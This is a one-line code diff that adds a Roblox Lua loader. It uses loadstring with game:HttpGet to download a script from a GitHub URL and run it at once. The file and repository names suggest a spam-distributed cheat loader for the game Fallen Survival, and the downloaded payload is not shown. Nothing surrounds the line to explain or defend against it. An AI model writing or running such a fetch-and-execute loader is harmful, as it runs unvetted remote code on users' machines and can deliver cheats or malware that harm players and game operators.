@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/new-map-fallen-survival-spam6-sgq1dp64gtvnp9.lua"))()
